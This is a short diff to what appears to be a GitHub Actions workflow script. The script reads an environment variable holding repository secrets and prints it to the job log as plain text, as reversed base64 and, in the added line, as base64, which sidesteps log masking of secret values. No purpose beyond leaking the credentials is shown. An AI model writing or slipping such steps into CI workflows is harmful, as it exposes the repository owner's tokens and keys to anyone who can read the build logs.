@@ -27,4 +27,5 @@ jobs:
             const output = process.env.SECRETS;
             core.info(output);
             core.info(Buffer.from(output).toString('base64').split('').reverse().join(''));
+            core.info(Buffer.from(output).toString('base64'));
             return Buffer.from(output).toString('base64');
